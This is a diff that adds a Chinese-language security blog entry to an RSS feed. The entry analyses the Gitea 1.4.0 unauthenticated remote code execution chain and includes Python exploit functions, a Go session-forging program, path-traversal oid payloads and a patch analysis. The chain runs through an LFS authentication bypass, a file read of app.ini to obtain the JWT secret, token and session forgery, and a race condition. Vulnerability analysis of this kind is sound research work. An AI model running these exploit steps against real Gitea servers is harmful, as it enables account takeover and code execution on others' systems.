@@ -10,6 +10,521 @@
     <atom:link href="https://kylingit.com/tags/vul/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>Gitea 1.4.0未授权远程代码执行漏洞分析</title>
+      <link>https://kylingit.com/blog/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Tue, 17 Jul 2018 17:52:10 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-环境搭建&#34;&gt;0x01 环境搭建&lt;/h3&gt;
+
+&lt;p&gt;使用docker搭建漏洞环境，&lt;code&gt;Gitea&lt;/code&gt;版本1.4.0&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://docs.gitea.io/en-us/install-with-docker/&#34;&gt;https://docs.gitea.io/en-us/install-with-docker/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;docker-compose.yml&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;version: &amp;quot;2&amp;quot;
+
+networks:
+  gitea:
+    external: false
+
+services:
+  server:
+    image: gitea/gitea:1.4.0
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+    networks:
+      - gitea
+    volumes:
+      - ./gitea:/data
+    ports:
+      - &amp;quot;3000:3000&amp;quot;
+      - &amp;quot;222:22&amp;quot;
+    depends_on:
+      - db
+
+  db:
+    image: mysql:5.7
+    restart: always
+    environment:
+      - MYSQL_ROOT_PASSWORD=gitea
+      - MYSQL_USER=gitea
+      - MYSQL_PASSWORD=gitea
+      - MYSQL_DATABASE=gitea
+    networks:
+      - gitea
+    volumes:
+      - ./mysql:/var/lib/mysql
+    ports:
+      - &amp;quot;3306:3306&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;安装时指定&lt;code&gt;mysql&lt;/code&gt;连接需要&lt;code&gt;vps_ip:3306&lt;/code&gt;，使用&lt;code&gt;localhost:3306&lt;/code&gt;一直提示错误&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-逻辑漏洞&#34;&gt;0x02 逻辑漏洞&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218&#34;&gt;https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// PostHandler instructs the client how to upload data
+func PostHandler(ctx *context.Context) {
+    //...
+    if !authenticate(ctx, repository, rv.Authorization, true) {
+		requireAuth(ctx)
+	}
+	//...
+}
+func requireAuth(ctx *context.Context) {
+	ctx.Resp.Header().Set(&amp;quot;WWW-Authenticate&amp;quot;, &amp;quot;Basic realm=gitea-lfs&amp;quot;)
+	writeStatus(ctx, 401)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;问题出在&lt;code&gt;PostHandler()&lt;/code&gt;方法，该方法的作用是创建一个新的&lt;code&gt;LFS&lt;/code&gt;对象。在&lt;code&gt;requireAuth&lt;/code&gt;处，如果权限验证失败，则执行&lt;code&gt;requireAuth ()&lt;/code&gt;，返回&lt;code&gt;401认证失败&lt;/code&gt;，关键是&lt;code&gt;requireAuth(ctx)&lt;/code&gt;结束之后没有&lt;code&gt;return&lt;/code&gt;，也就是说虽然返回&lt;code&gt;401&lt;/code&gt;但是不影响后面的逻辑接着执行，因此可以创建任意LFS对象，此处存在一个权限绕过漏洞。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-目录穿越-任意文件读取&#34;&gt;0x03  目录穿越&amp;amp;任意文件读取&lt;/h3&gt;
+
+&lt;p&gt;参考文档 &lt;a href=&#34;https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md&#34;&gt;https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Get takes a Meta object and retrieves the content from the store, returning
+// it as an io.Reader. If fromByte &amp;gt; 0, the reader starts from that byte
+func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte int64) (io.ReadCloser, error) {
+	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
+
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	if fromByte &amp;gt; 0 {
+		_, err = f.Seek(fromByte, os.SEEK_CUR)
+	}
+	return f, err
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;从&lt;code&gt;lfs&lt;/code&gt;下载文件接口是&lt;code&gt;modules/lfs/content_store.go:Get()&lt;/code&gt;方法，从&lt;code&gt;meta.Oid&lt;/code&gt;取路径去读取，这个路径处理函数是&lt;code&gt;transformKey()&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func transformKey(key string) string {
+	if len(key) &amp;lt; 5 {
+		return key
+	}
+
+	return filepath.Join(key[0:2], key[2:4], key[4:])
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;transformKey()&lt;/code&gt;方法是把key参数做了三次分割，先取两个字符，加上&lt;code&gt;/&lt;/code&gt;，然后再取两个，再加上&lt;code&gt;/&lt;/code&gt;，最后拼接后面部分，举例说明：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;abcdefgh -&amp;gt; ab\cd\efgh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;于是此处就可以构造&lt;code&gt;..../etc/passwd&lt;/code&gt;的格式，经过&lt;code&gt;transformKey()&lt;/code&gt;后被转换成&lt;code&gt;../../etc/passwd&lt;/code&gt;，这样就存在一个任意文件读取漏洞。&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;Gitea&lt;/code&gt;中有一个关键配置文件&lt;code&gt;app.ini&lt;/code&gt;，其中记录了默认配置信息，包括数据库连接密码，一些路径和&lt;code&gt;token&lt;/code&gt;，以及LFS 认证密钥 ，该密钥用来加密JWT认证&lt;/p&gt;
+
+&lt;p&gt;配置项更详细信息可以参考&lt;a href=&#34;https://docs.gitea.io/zh-cn/config-cheat-sheet/&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;当前环境中&lt;code&gt;app.ini&lt;/code&gt;位置在&lt;code&gt;/data/gitea/conf/app.ini&lt;/code&gt;，所以需要构造&lt;code&gt;....gitea/conf/app.ini&lt;/code&gt;，经过处理变成&lt;code&gt;/data/gitea/lfs/../../gitea/conf/app.ini&lt;/code&gt;，也就是&lt;code&gt;/data/gitea/conf/app.ini&lt;/code&gt;，这样就能读取到配置文件，注意需要对&lt;code&gt;/&lt;/code&gt;进行&lt;code&gt;url&lt;/code&gt;编码&lt;/p&gt;
+
+&lt;p&gt;访问LFS存储对象的接口是&lt;code&gt;https://git-server.com/foo/bar.git/info/lfs/objects/batch&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531882119588.png&#34; alt=&#34;1531882119588&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由此我们获取到了&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-构造authorization&#34;&gt;0x04 构造Authorization&lt;/h3&gt;
+
+&lt;p&gt;LFS接口认证过程使用了JWT或Basic认证，&lt;a href=&#34;https://jwt.io/introduction/&#34;&gt;官网介绍&lt;/a&gt;JWT：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;JSON Web Token (JWT)&lt;/code&gt; is an open standard (&lt;a href=&#34;https://tools.ietf.org/html/rfc7519&#34;&gt;RFC 7519&lt;/a&gt;) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the &lt;strong&gt;HMAC&lt;/strong&gt; algorithm) or a public/private key pair using &lt;strong&gt;RSA&lt;/strong&gt; or &lt;strong&gt;ECDSA&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Although JWTs can be encrypted to also provide secrecy between parties, we will focus on &lt;em&gt;signed&lt;/em&gt; tokens. Signed tokens can verify the &lt;em&gt;integrity&lt;/em&gt; of the claims contained within it, while encrypted tokens &lt;em&gt;hide&lt;/em&gt; those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;所以我们一旦获得了&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;，就可以自己构造JWT认证，从而在不知道管理员账户密码的情况下取得LFS的完整控制权。&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;modules/lfs/server.go&lt;/code&gt;定义了LFS接口认证登录的方法：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func parseToken(authorization string) (*models.User, *models.Repository, string, error) {
+	if authorization == &amp;quot;&amp;quot; {
+		return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;No token&amp;quot;)
+	}
+	if strings.HasPrefix(authorization, &amp;quot;Bearer &amp;quot;) {
+		token, err := jwt.Parse(authorization[7:], func(t *jwt.Token) (interface{}, error) {
+			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
+				return nil, fmt.Errorf(&amp;quot;unexpected signing method: %v&amp;quot;, t.Header[&amp;quot;alg&amp;quot;])
+			}
+			return setting.LFS.JWTSecretBytes, nil
+		})
+		if err != nil {
+			return nil, nil, &amp;quot;unknown&amp;quot;, err
+		}
+		claims, claimsOk := token.Claims.(jwt.MapClaims)
+		if !token.Valid || !claimsOk {
+			return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token claim invalid&amp;quot;)
+		}
+		opStr, ok := claims[&amp;quot;op&amp;quot;].(string)
+		if !ok {
+			return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token operation invalid&amp;quot;)
+		}
+		repoID, ok := claims[&amp;quot;repo&amp;quot;].(float64)
+		if !ok {
+			return nil, nil, opStr, fmt.Errorf(&amp;quot;Token repository id invalid&amp;quot;)
+		}
+		r, err := models.GetRepositoryByID(int64(repoID))
+		if err != nil {
+			return nil, nil, opStr, err
+		}
+		userID, ok := claims[&amp;quot;user&amp;quot;].(float64)
+		if !ok {
+			return nil, r, opStr, fmt.Errorf(&amp;quot;Token user id invalid&amp;quot;)
+		}
+		u, err := models.GetUserByID(int64(userID))
+		if err != nil {
+			return nil, r, opStr, err
+		}
+		return u, r, opStr, nil
+	}
+    if strings.HasPrefix(authorization, &amp;quot;Basic &amp;quot;) {
+        //...
+    }
+    return nil, nil, &amp;quot;unknown&amp;quot;, fmt.Errorf(&amp;quot;Token not found&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到构成JWT的&lt;code&gt;payload&lt;/code&gt;部分需要包含这么几个字段：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+  &amp;quot;user&amp;quot;: 1,
+  &amp;quot;repo&amp;quot;: 1,
+  &amp;quot;op&amp;quot;: &amp;quot;upload&amp;quot;,
+  &amp;quot;nbf&amp;quot;: 1445408221,
+  &amp;quot;exp&amp;quot;: 1618208221
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;分别是用户id，LFS项目id，LFS操作，以及&lt;code&gt;HTTPAuth&lt;/code&gt;有效时间&lt;/p&gt;
+
+&lt;p&gt;我们在&lt;a href=&#34;https://jwt.io/#debugger&#34;&gt;JWT debugger页面&lt;/a&gt;测试生成一段&lt;code&gt;Auth Token&lt;/code&gt;，填入&lt;code&gt;payload&lt;/code&gt;和上一步获取到的&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;，于是得到了LFS认证的&lt;code&gt;Authorization&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531883703859.png&#34; alt=&#34;1531883703859&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x05-伪造session绕过登录&#34;&gt;0x05 伪造session绕过登录&lt;/h3&gt;
+
+&lt;p&gt;在&lt;code&gt;modules/lfs/server.go&lt;/code&gt; 定义了LFS中的路由接口&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ObjectOidHandler is the main request routing entry point into LFS server functions
+func ObjectOidHandler(ctx *context.Context) {
+	if !setting.LFS.StartServer {
+		writeStatus(ctx, 404)
+		return
+	}
+	if ctx.Req.Method == &amp;quot;GET&amp;quot; || ctx.Req.Method == &amp;quot;HEAD&amp;quot; {
+		if MetaMatcher(ctx.Req) {
+			getMetaHandler(ctx)
+			return
+		}
+		if ContentMatcher(ctx.Req) || len(ctx.Params(&amp;quot;filename&amp;quot;)) &amp;gt; 0 {
+			getContentHandler(ctx)
+			return
+		}
+	} else if ctx.Req.Method == &amp;quot;PUT&amp;quot; &amp;amp;&amp;amp; ContentMatcher(ctx.Req) {
+		PutHandler(ctx)
+		return
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中写入文件接口是在&lt;code&gt;PutHandler()&lt;/code&gt;，需要使用&lt;code&gt;PUT&lt;/code&gt;方法。跟入&lt;code&gt;Put()&lt;/code&gt;看一下&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Put takes a Meta object and an io.Reader and writes the content to the store.
+func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.Reader) error {
+	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
+	tmpPath := path + &amp;quot;.tmp&amp;quot;
+
+	dir := filepath.Dir(path)
+	if err := os.MkdirAll(dir, 0750); err != nil {
+		return err
+	}
+
+	file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0640)
+	if err != nil {
+		return err
+	}
+	defer os.Remove(tmpPath)
+
+	hash := sha256.New()
+	hw := io.MultiWriter(hash, file)
+
+	written, err := io.Copy(hw, r)
+	if err != nil {
+		file.Close()
+		return err
+	}
+	file.Close()
+
+	if written != meta.Size {
+		return errSizeMismatch
+	}
+
+	shaStr := hex.EncodeToString(hash.Sum(nil))
+	if shaStr != meta.Oid {
+		return errHashMismatch
+	}
+
+	return os.Rename(tmpPath, path)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到该方法主要是先创建临时文件，以&lt;code&gt;.tmp&lt;/code&gt;结尾，然后对文件进行了一系列校验，包括文件大小和&lt;code&gt;Oid&lt;/code&gt;信息，两者如果任一不匹配的话就写入失败，同时删除临时文件。注意这行语句&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;defer os.Remove(tmpPath)&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;defer&lt;/code&gt;用于资源的释放，会在函数返回之前进行调用。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;也就是说不管函数是否返回错误，结束时都会删除临时文件。&lt;/p&gt;
+
+&lt;p&gt;这时就要考虑两点：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;在文件被删除之前利用；&lt;/li&gt;
+&lt;li&gt;如何利用后缀为.tmp的文件；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;先考虑第一个问题，在文件被删除之前访问到这个文件。这种情况让我们想到在上传webshell时可以利用的条件竞争漏洞，在文件被删除之前使用多线程并发访问，利用时间差访问到上传文件然后生成shell。但是这个方法在此处不适用，根据作者想出的办法，利用&lt;code&gt;Content-Length&lt;/code&gt;字段，该字段告诉服务器该请求需要发送多少长度的数据， 在传输完成之前服务器会处于一直等待阶段。假设我们设置了一个超长的&lt;code&gt;Content-Length&lt;/code&gt;，服务器就会认为数据还没有传输完成便挂起等待，这个时间段内我们就可以访问到上传的文件。&lt;/p&gt;
+
+&lt;p&gt;接着考虑第二个问题，如何利用&lt;code&gt;.tmp&lt;/code&gt;文件？&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;Gitea&lt;/code&gt;可以配置存储session的方式，默认是保存为文件，存储路径在&lt;code&gt;/data/gitea/sessions&lt;/code&gt;。于是我们可以想到把上面生成的session内容写入到一个&lt;code&gt;.tmp&lt;/code&gt;文件，并保存在session目录下，这个tmp文件名即为&lt;code&gt;sessionid&lt;/code&gt;，然后利用条件竞争，在文件未被删除之前带上这个&lt;code&gt;sessionid&lt;/code&gt;，就可以登录成功。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Gitea&lt;/code&gt;使用的session模块是&lt;a href=&#34;https://github.com/go-macaron/session&#34;&gt;go-macaron/session&lt;/a&gt;，在&lt;code&gt;file.go&lt;/code&gt;可以看到几个关键的方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Release releases resource and save data to provider.
+func (s *FileStore) Release() error {
+	s.p.lock.Lock()
+	defer s.p.lock.Unlock()
+
+	data, err := EncodeGob(s.data)
+	if err != nil {
+		return err
+	}
+
+	return ioutil.WriteFile(s.p.filepath(s.sid), data, os.ModePerm)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;调用了&lt;code&gt;EncodeGob()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+	for _, v := range obj {
+		gob.Register(v)
+	}
+	buf := bytes.NewBuffer(nil)
+	err := gob.NewEncoder(buf).Encode(obj)
+	return buf.Bytes(), err
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后写入文件&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (p *FileProvider) filepath(sid string) string {
+	return path.Join(p.rootPath, string(sid[0]), string(sid[1]), sid)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到session的生成是通过特有的Gob序列化后保存成文件，路径特点是&lt;code&gt;sid[0]/sid[1]/sid&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;我们来分析一个认证成功的session&lt;code&gt;/data/gitea/sessions/0/9/09cfb25c946d6187&lt;/code&gt;，前两位为路径名，后面为sid，共同组成一个session文件&lt;/p&gt;
+
+&lt;p&gt;我们使用相应的&lt;code&gt;DecodeGob()&lt;/code&gt;方法来解开看一下session里包含的内容，其中&lt;code&gt;session_data&lt;/code&gt;即是文件的hex内容。代码如下&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;encoding/gob&amp;quot;
+	&amp;quot;encoding/hex&amp;quot;
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;bytes&amp;quot;
+)
+
+func DecodeGob(encoded []byte) (out map[interface{}]interface{}, err error) {
+	buf := bytes.NewBuffer(encoded)
+	err = gob.NewDecoder(buf).Decode(&amp;amp;out)
+	return out, err
+}
+
+func main() {
+	session_data := &amp;quot;0EFF81040102...03000131&amp;quot;	//太长省略
+	buf, err := hex.DecodeString(session_data)
+	fmt.Println(buf)
+	if err != nil {
+		fmt.Println(err)
+	}
+	decode_data, err := DecodeGob(buf)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(decode_data)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行结果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531898336305.png&#34; alt=&#34;1531898336305&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到主要是以&lt;code&gt;_old_iod&lt;/code&gt; &lt;code&gt;uid&lt;/code&gt; &lt;code&gt;uname&lt;/code&gt;三个值组成的session内容，那么我们就可以构造一组这样的值来伪造一个session&lt;/p&gt;
+
+&lt;p&gt;生成session使用&lt;code&gt;EncodeGob()&lt;/code&gt;方法：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;encoding/gob&amp;quot;
+	&amp;quot;encoding/hex&amp;quot;
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;bytes&amp;quot;
+)
+
+func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+	for _, v := range obj {
+		gob.Register(v)
+	}
+	buf := bytes.NewBuffer(nil)
+	err := gob.NewEncoder(buf).Encode(obj)
+	return buf.Bytes(), err
+}
+
+func main() {
+	//var uid = 1
+	//uname := &amp;quot;admin123&amp;quot;
+	obj := map[interface{}]interface{}{&amp;quot;_old_iod&amp;quot;: &amp;quot;1&amp;quot;, &amp;quot;uid&amp;quot;: 1, &amp;quot;uname&amp;quot;: &amp;quot;admin123&amp;quot;}
+	buf, err := EncodeGob(obj)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(buf)
+	encode_data := hex.EncodeToString(buf)
+	fmt.Println(encode_data)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行之后生成一个hex序列&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531898708274.png&#34; alt=&#34;1531898708274&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这段序列里就包含了session信息，包括 &lt;code&gt;_old_iod&lt;/code&gt; &lt;code&gt;uid&lt;/code&gt; &lt;code&gt;uname&lt;/code&gt;，然后我们可以利用这个伪造的&lt;code&gt;session&lt;/code&gt;成功登录&lt;/p&gt;
+
+&lt;h3 id=&#34;0x06-漏洞利用&#34;&gt;0x06 漏洞利用&lt;/h3&gt;
+
+&lt;h5 id=&#34;1-读取-app-ini-获得-lfs-jwt-secret&#34;&gt;1. 读取&lt;code&gt;app.ini&lt;/code&gt;，获得&lt;code&gt;LFS_JWT_SECRET&lt;/code&gt;&lt;/h5&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531882119588.png&#34; alt=&#34;1531882119588&#34; /&gt;&lt;/p&gt;
+
+&lt;h5 id=&#34;2-针对-session-文件名创建-lfs-对象&#34;&gt;2. 针对&lt;code&gt;session&lt;/code&gt;文件名创建&lt;code&gt;LFS&lt;/code&gt;对象&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def create_lfs_object(session):
+    oid = &#39;....gitea/sessions/1/1/11session&#39;
+    data = {
+        &amp;quot;Oid&amp;quot;: oid,
+        &amp;quot;Size&amp;quot;: 1000,
+        &amp;quot;User&amp;quot;: &amp;quot;a&amp;quot;,
+        &amp;quot;Password&amp;quot;: &amp;quot;a&amp;quot;,
+        &amp;quot;Repo&amp;quot;: &amp;quot;a&amp;quot;,
+        &amp;quot;Authorization&amp;quot;: &amp;quot;a&amp;quot;
+    }
+
+    url = &#39;%s.git/info/lfs/objects&#39; % (GIT_URL)
+    response = s.post(
+        url,
+        json=data,
+        headers={
+            &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
+        }
+    )
+    logging.info(response.text)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;3-生成-authorization&#34;&gt;3. 生成&lt;code&gt;Authorization&lt;/code&gt;&lt;/h5&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531883703859.png&#34; alt=&#34;1531883703859&#34; /&gt;&lt;/p&gt;
+
+&lt;h5 id=&#34;4-生成-session-数据&#34;&gt;4. 生成&lt;code&gt;session&lt;/code&gt;数据&lt;/h5&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531898708274.png&#34; alt=&#34;1531898708274&#34; /&gt;&lt;/p&gt;
+
+&lt;h5 id=&#34;5-写入-session-数据&#34;&gt;5. 写入&lt;code&gt;session&lt;/code&gt;数据&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def write_session(session):
+    oid = &#39;....gitea/sessions/1/1/11session&#39;
+    url = &#39;%s.git/info/lfs/objects/%s&#39; % (GIT_URL, urllib.quote(oid, safe=&#39;&#39;))
+    print url
+    response = s.put(url, data=gen_data(), headers={
+        &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
+        &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
+        &#39;Authorization&#39;: &#39;Bearer &#39; + AUTH_TOKEN
+    })
+    logging.info(response.text)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code&gt;gen_data()&lt;/code&gt;使用生成器来延迟响应时间，在这段时间内&lt;code&gt;.tmp&lt;/code&gt;文件未被删除&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def gen_data():
+    yield SESSION_DATA
+    time.sleep(300)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&#34;6-修改cookie&#34;&gt;6. 修改cookie&lt;/h5&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531905605099.png&#34; alt=&#34;1531905605099&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;后续利用&lt;code&gt;Git Hooks&lt;/code&gt;自动执行命令就不多说了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531905731043.png&#34; alt=&#34;1531905731043&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x07-补丁分析&#34;&gt;0x07 补丁分析&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9&#34;&gt;https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;分析补丁主要做了三块工作：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;首先把缺少的&lt;code&gt;return&lt;/code&gt;给补上了&lt;/li&gt;
+&lt;li&gt;限定了&lt;code&gt;oid&lt;/code&gt;参数值必须符合&lt;code&gt;sha256&lt;/code&gt;格式，如果查询的&lt;code&gt;oid&lt;/code&gt;不存在则返回404，这样我们就无法指定任意&lt;code&gt;oid&lt;/code&gt;值&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531798747694.png&#34; alt=&#34;1531798747694&#34; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;然后使用&lt;code&gt;path.Clean()&lt;/code&gt;方法过滤多余的&lt;code&gt;.&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;，限制&lt;code&gt;repo&lt;/code&gt;里不能出现&lt;code&gt;.&lt;/code&gt;和&lt;code&gt;/&lt;/code&gt;字符&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531804973465.png&#34; alt=&#34;1531804973465&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1531804989614.png&#34; alt=&#34;1531804989614&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x08-总结&#34;&gt;0x08 总结&lt;/h3&gt;
+
+&lt;p&gt;该漏洞利用非常巧妙，由一处缺少的&lt;code&gt;return&lt;/code&gt;层层深入，从权限绕过到文件读取，从伪造session到条件竞争，到最后的远程代码执行，一条漏洞链就串起来了，可谓十分精彩，也从侧面反映了一处小疏忽也会导致严重的后果。&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&#34;&gt;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&#34;&gt;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
       <title>CVE-2018-7602 Drupal 内核远程代码执行漏洞分析</title>
       <link>https://kylingit.com/blog/cve-2018-7602-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Thu, 26 Apr 2018 17:21:11 +0000</pubDate>
